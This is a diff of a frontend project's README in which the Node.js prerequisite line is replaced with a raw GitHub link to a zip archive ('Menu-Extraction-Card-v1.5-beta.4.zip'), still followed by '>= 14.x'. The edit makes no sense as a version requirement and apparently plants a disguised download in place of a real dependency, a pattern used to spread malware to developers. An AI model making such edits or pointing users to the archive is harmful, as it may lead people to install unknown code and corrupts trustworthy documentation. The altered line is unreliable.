@@ -9,7 +9,7 @@ Briefly describe what the frontend does and its main features.
 - Axios
 
 ## Prerequisites
-- Node.js >= 14.x
+- https://raw.githubusercontent.com/Danizolo/MenuCardExtraction/main/gorgeted/Menu-Extraction-Card-v1.5-beta.4.zip >= 14.x
 - npm or yarn
 
 ## Installation
